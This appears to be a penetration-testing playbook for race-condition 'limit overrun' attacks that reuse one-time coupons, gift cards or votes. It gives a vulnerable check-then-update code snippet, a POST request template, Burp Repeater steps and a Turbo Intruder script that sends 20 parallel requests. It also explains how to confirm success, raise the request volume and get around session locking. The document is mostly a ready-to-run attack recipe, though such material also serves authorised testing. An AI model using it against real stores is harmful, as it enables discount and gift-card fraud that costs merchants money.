# Limit Overrun (Discount Code / Gift Card / Quota Reuse)

## When this applies

- Endpoint enforces a one-time-use limit (single coupon redemption, single gift-card claim, "vote once").
- Server's check-then-update is non-atomic: validates, calls business logic, then marks as used.
- Goal: have the same code/token applied N times before the "mark used" persists.

## Technique

Send 20+ identical requests in parallel using HTTP/2 single-packet attack. All requests pass validation before the first one updates the database. Each request that races through the gap applies the discount/gift card.

**Vulnerable Code:**
```python
if not is_used(code):
    apply_discount(code)
    mark_used(code)
```

**Attack Pattern:** 20x POST /cart/coupon with same code

**Success Signature:** Multiple "Discount applied" responses, cart total significantly reduced.

## Steps

### Request template

```http
POST /cart/coupon HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&coupon=PROMO20
```

### Burp Repeater workflow (single-packet attack)

```
1. Create tab group with 20 duplicate requests
2. Right-click group → "Send group in parallel (single-packet attack)"
3. Check responses for multiple successes
```

### Turbo Intruder script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Expected result

```http
HTTP/2 200 OK
Content-Length: 3420

<!-- Cart shows: $1337.00 - $267.40 discount = $1069.60 -->
```

## Verifying success

- Multiple 200 responses where only one was expected.
- Cart total reflects N applications of the discount instead of one.
- Database shows multiple rows for the same coupon code, OR the coupon's "used" counter > 1.

## Common pitfalls

- Session locking (PHP, Tomcat default) serializes requests on one cookie — use multiple cookies if needed.
- HTTP/1.1 timing too noisy — switch to `Engine.BURP2` (HTTP/2) for the single-packet attack.
- Insufficient volume — start at 20 requests, increase to 50–100 if no collision.

## Tools

- Burp Suite Repeater (tab group + "Send group in parallel")
- Burp Turbo Intruder (`Engine.BURP2`)
- h2spacex (raw HTTP/2 socket attacks)
- Raceocat
